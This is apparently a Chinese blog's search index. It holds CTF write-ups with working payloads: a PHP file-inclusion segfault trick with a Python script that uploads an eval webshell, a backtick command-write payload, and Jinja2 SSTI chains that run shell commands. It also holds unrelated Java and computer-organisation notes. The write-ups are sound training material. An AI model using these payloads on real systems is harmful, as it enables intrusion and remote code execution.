<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NPUCTF2020 ezinclude_0x90-0x9F</title>
      <link href="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/"/>
      <url>/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</url>
      
        <content type="html"><![CDATA[<p>最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p><p>进去直接来个错误？？？WTF?</p><p>看下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p><p>疑似哈希长度拓展攻击，抓下包看看</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p><p>芜湖，hash直接给我了？</p><p>直接传好像不太行?</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p><p>祭出神器burp</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p><p>得到文件名 flflflflag.php</p><p>访问一下文件:</p><p>得到如下response</p><pre><code class="html">HTTP/1.1 200 OKServer: openrestyDate: Sun, 13 Feb 2022 04:47:35 GMTContent-Type: text/html; charset=UTF-8Content-Length: 241Connection: closeVary: Accept-EncodingX-Powered-By: PHP/7.0.33&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>我已经有了女朋友所以我比出题人强(手动狗头)</p><p>include 函数好家伙，文件包含应该有了</p><p>来读取下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p><p>解码如下:</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;</code></pre><p>过滤了很多东西，没法命令执行了。</p><p>那就扫一下目录把:</p><p>最终扫出来了一个</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p><p>这个目录应该是告诉我们文件的名字，来结合文件包含使用。所以我们就要尝试去传shell</p><p>可以用php7 segment fault特性</p><blockquote><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p></blockquote><p>参考链接；<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这里我们可以直接知道文件名就不需要爆破了</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><pre><code>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</code></pre><p>payload</p><pre><code class="php">php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwdphp7 老版本通杀php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>由于tmp目录一般是不可访问的，所以该漏洞常常和文件包含结合起来使用</p><p>exp如下:</p><pre><code class="python">import requestsfrom io import BytesIOurl=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><p>运行</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p><p>这里多了一个文件</p><p>使用蚁剑连接</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p><p>测试成功了，但是无法添加，，莫名的错误</p><p>同理那就再添加个phpinfo吧</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p><p>成功找到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码\命令执行类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷CTF 2021 write_shell_0x81-0x8F</title>
      <link href="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
      <url>/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</url>
      
        <content type="html"><![CDATA[<p>这道题属于比较简单的，让我们来看一下源码</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png" alt="image-20220212104506611"></p><p>当我们在后缀加上?action=pwd 就可以得到路径</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104652393.png" alt="image-20220212104652393"></p><p>再换成upload就可以写文件</p><p>?action=upload&amp;date=xxx</p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><p>PHP中，反引号可以起到命令执行的效果</p><p>空格可以用url编码绕过%09</p><p>由这个我们就可以构造出payload</p><pre><code>?action=upload&amp;data=&lt;?=%09`whoami`?&gt;</code></pre><p>访问文件</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212110632709.png" alt="image-20220212110632709"></p><p>成功执行了命令</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111111008.png" alt="image-20220212111111008"></p><p>直接获取根目录所有文件信息，访问文件，获得flag</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111030856.png" alt="image-20220212111030856"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>前言：由于本人非计算机专业(苦逼化工狗)，所以想要自己补一下计算机的基础，这样才能发展的更远，所以开了这一栏，以后会坚持更新~</p><h1 id="计算机组成原理概述篇"><a href="#计算机组成原理概述篇" class="headerlink" title="计算机组成原理概述篇"></a>计算机组成原理概述篇</h1><h2 id="计算机的发展历史"><a href="#计算机的发展历史" class="headerlink" title="计算机的发展历史"></a>计算机的发展历史</h2><h3 id="计算机发展的四个阶段"><a href="#计算机发展的四个阶段" class="headerlink" title="计算机发展的四个阶段"></a>计算机发展的四个阶段</h3><p>第一个阶段:电子管计算机</p><p>集成度小，空间占用大</p><p>功耗高，运行速度慢</p><p>操作复杂，更换程序需要接线</p><p>第二个阶段:晶体管计算机</p><p>集成度相对较高，空间占用相对小</p><p>功耗相对较低，运行速度快</p><p>操作相对简单，交互更加方便</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211222959451.png" alt="image-20220211222959451"></p><p>第三个阶段:集成电路计算机</p><p>计算机变得更小</p><p>功耗变得更低</p><p>计算速度变得更快</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211223618107.png" alt="image-20220211223618107"></p><p>第四个阶段:超大规模集成电路计算机</p><p>一个芯片集成了上百万的晶体管<br>速度更快，体积更小，价格更低，更能被大众接受</p><p>用途丰富:文本处理，表格处理，高交互的游戏与应用</p><p>第五个阶段:未来计算机</p><p>生物计算机，以蛋白质分子作为主要原材料:</p><p>体积小，效率高</p><p>不易损坏</p><p>不受信号干扰，无热损耗 1</p><p>量子计算机</p><h3 id="微型计算机的发展历史"><a href="#微型计算机的发展历史" class="headerlink" title="微型计算机的发展历史"></a>微型计算机的发展历史</h3><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224519853.png" alt="image-20220211224519853"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224544536.png" alt="image-20220211224544536"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224641392.png" alt="image-20220211224641392"></p><h2 id="计算机的分类"><a href="#计算机的分类" class="headerlink" title="计算机的分类"></a>计算机的分类</h2><p>超级计算机:</p><p>功能最强、运算速度最快、存储容量最大的计算机</p><p>多用于国家高科技领域和尖端技术研究</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225354851.png" alt="image-20220211225354851"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225444783.png" alt="image-20220211225444783"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225558827.png" alt="image-20220211225558827"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225812247.png" alt="image-20220211225812247"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225834345.png" alt="image-20220211225834345"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225944642.png" alt="image-20220211225944642"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230055284.png" alt="image-20220211230055284"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230109064.png" alt="image-20220211230109064"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230145911.png" alt="image-20220211230145911"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230155449.png" alt="image-20220211230155449"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230249731.png" alt="image-20220211230249731"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230318814.png" alt="image-20220211230318814"></p><h2 id="计算机的体系与结构"><a href="#计算机的体系与结构" class="headerlink" title="计算机的体系与结构"></a>计算机的体系与结构</h2><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212231520062.png" alt="image-20220212231520062"></p><p><strong>必须有一个存储器</strong></p><p><strong>必须有一个控制器</strong></p><p><strong>必须有一个运算器</strong></p><p><strong>必须有输入设备</strong></p><p><strong>必须有输出设备</strong></p><p>现代计算机都是冯诺依曼机</p><p>功能:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232001255.png" alt="image-20220212232001255"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232045504.png" alt="image-20220212232045504"></p><p>瓶颈:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232350723.png" alt="image-20220212232350723"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232427464.png" alt="image-20220212232427464"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232520952.png" alt="image-20220212232520952"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232603902.png" alt="image-20220212232603902"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习之旅</title>
      <link href="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
      <url>/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>本篇文章更新java系列知识—持续更新中</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png" alt="image-20220211163044997"></p><h1 id="day1-java初识"><a href="#day1-java初识" class="headerlink" title="day1 java初识"></a>day1 java初识</h1><h2 id="第一个HelloWord程序"><a href="#第一个HelloWord程序" class="headerlink" title="第一个HelloWord程序"></a>第一个HelloWord程序</h2><pre><code class="java">/*这里HelloWord是类名void main 是方法，也是程序的入口void 空main 主函数*/class HelloWord&#123;    public static void main(String[] args)&#123;                System.out.println(&quot;Hello Word!&quot;);    &#125;&#125;</code></pre><p>首先用 javac helloword.java –&gt;编译为   helloword.class</p><p>然后 java helloword 执行(这里注意不要加后缀!)</p><p>结果如下：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211171119785.png" alt="image-20220211171119785"></p><p>注意点:</p><p>1、java中严格区分大小写</p><p>2、要记得更改编辑器的编码方式 要保持编码一致才能运行</p><p>3、每一行语句结束必须以;结束</p><p>4、注意缩进</p><p>5、类名是什么，生成的字节码文件是什么，与原文件名字没有直接关系。</p><p>6、当类是公共的，既用public修饰类，类名必须与文件名保持一致</p><p>7、一个java文件中可以有多个类，每个类在编译后都会生成一个字节码文件。</p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210820972.png" alt="image-20220211210820972"></p><p>关键字有：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210537067.png" alt="image-20220211210537067"></p><p>其中const和goto是保留字</p><h2 id="规范"><a href="#规范" class="headerlink" title="规范:"></a>规范:</h2><p>1、见名知意</p><p>2、驼峰命名</p><p>当变量名 方法名 参数名 由两个或两个单词以上组成时，从第二个单词开始首字母大写</p><p>如：userName passWord</p><p>3、对常量进行命名时，每个单词的字母都大写，而且单词与单词之间使用_相连</p><p>如: MAX_NUM</p><p>4、对类进行命名时，对每一个单词的首字母大写</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>基本数据类型(四类八种):</p><p>整数型:</p><p>​        byte 字节类型        short         int         long</p><p>浮点类型:</p><p>​        float 单精度        double 双精度</p><p>字符型: </p><p>​        char</p><p>布尔型:</p><p>​        boolean:</p><p>​            true        false</p><p>引用类型数据:字符串 类 接口</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p> 字符串常量            浮点类型常量             字符常量           布尔类型常量            内置的常量</p><p>“HelloWoerd”                3.14                         ‘你’                        true                       Math.PI</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在程序执行过程中，其值可以改变的量</p><p>三要素:</p><p>变量类型        变量名        变量值</p><p>如何申明变量?</p><p>数据类型+变量名</p><p>申明整数类型变量:</p><p>byte b;        long 1;</p><p>同理可生成</p><p>float f;    double d;    char c;    String s;</p><p>在方法内的变量 申明后要赋值才能使用</p><p>变量的实质就是申请内存</p><h1 id="day2-java基础语法"><a href="#day2-java基础语法" class="headerlink" title="day2 java基础语法"></a>day2 java基础语法</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换:"></a>进制转换:</h2><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            System.out.println(666);   //十进制            System.out.println(0b1010011010); //二进制  0b开头            System.out.println(01232);  //八进制 0开头            System.out.println(0x29a); //十六进制 0x开头            &#125;&#125;</code></pre><p>输出结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154216121.png" alt="image-20220212154216121"></p><h2 id="计算机存储单位"><a href="#计算机存储单位" class="headerlink" title="计算机存储单位"></a>计算机存储单位</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154344804.png" alt="image-20220212154344804"></p><p>1 byte = 8 bit;  没有符号的范围: 2^8-1  有符号(第一位做符号位): -128 - 127</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212160938532.png" alt="image-20220212160938532"></p><p>整数类型   注意:</p><p>1、整数类型，默认的数据类型是int</p><p>2、错误：不兼容的类型：从int转换到byte可能有损失</p><p>当我们赋的值在byte或者short的范围内则不会有变化</p><p>但是当赋的值不在byte或者short的范围内则会将此值作为int类型处理<br>3、错误:过大的整数：2222222222</p><p>生命long类型数值的时候，要在数值的末尾+L</p><p>浮点类型    注意:</p><p>1、浮点类型 默认的数据类型是double</p><p>2、不兼容的类型：从double转换到float可能会有损失</p><p>申明float类型的数据 要在数值的末尾 +  F</p><p>float f =3.14F</p><p>3、浮点类型底层采用的是科学计数法方式</p><p>4、小数底层存储方式与整数不同  有符号位 指数位 整数位</p><p>5、小数不能精确的表示一个值 (如果要精确的表示需要用到bigdecimal)</p><h2 id="计算机如何存储数据"><a href="#计算机如何存储数据" class="headerlink" title="计算机如何存储数据"></a>计算机如何存储数据</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172832527.png" alt="image-20220212172832527"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172817453.png" alt="image-20220212172817453"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173056936.png" alt="image-20220212173056936"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173119494.png" alt="image-20220212173119494"></p><h2 id="自动类型提升"><a href="#自动类型提升" class="headerlink" title="自动类型提升"></a>自动类型提升</h2><p>基本类型数据转换:</p><p>1、自动类型提升</p><p>小的数据类型 可以自动转换为大的数据类型</p><pre><code class="java">int d = 3;double f = d;</code></pre><p>2、强制类型转换</p><p>错误：不兼容的类型，从double转换到int可能会有损失</p><p> 强制转换的公式:</p><p>小的数据类型 标识符 = (小的数据类型)大的数据类型</p><pre><code class="java">double d = 3.14;int num = (int)d;</code></pre><p>特殊情况</p><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            int a = 200;            byte b = (byte)a;            System.out.println(b);        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221045664.png" alt="image-20220212221045664"></p><p>为什么这里是-56呢？</p><p>首先我们知道 int是四个字节，而byte只有一个字节，200的二进制数为 11001000</p><p>刚好byte可以全部接受，但是byte第一位是符号位，首位是1，所以是负数，计算机的存储方式是以补码的形式存储。11001000—&gt;10110111(反码)—&gt;10111000(补码)</p><p>转化为十进制就是-56</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221721358.png" alt="image-20220212221721358"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222704014.png" alt="image-20220212222704014"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222746808.png" alt="image-20220212222746808"></p><p>注意:</p><p>1、整数相除，不保留小数</p><p>2、如果想要显示小数，使用浮点类型计算</p><p>3、 byte与byte  short与short char与char 做运算，或者他们之间混合运算，则结果会变为int类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212225720878.png" alt="image-20220212225720878"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212230210588.png" alt="image-20220212230210588"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</title>
      <link href="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/"/>
      <url>/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</url>
      
        <content type="html"><![CDATA[<h1 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h1><p>这道题是模板注入。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p><h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" 